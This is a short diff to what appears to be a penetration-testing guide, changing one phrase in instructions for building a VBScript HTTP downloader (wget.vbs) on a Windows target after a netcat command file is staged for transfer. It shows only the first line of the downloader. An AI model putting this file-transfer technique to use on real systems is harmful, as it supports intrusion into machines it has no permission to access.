@@ -34,7 +34,7 @@ Success! /var/www/html/nc.cmd is ready to be transfered to the target!
 
 
 
-You may need to create a HTTP Downloader which can be done by copying and pasting the following code and pasting it to the Windows CLI:
+You may need to create a HTTP Downloader which can be done by copying the following code and pasting it to the Windows CLI:
 
 
 ```echo strUrl = WScript.Arguments.Item(0) > wget.vbs
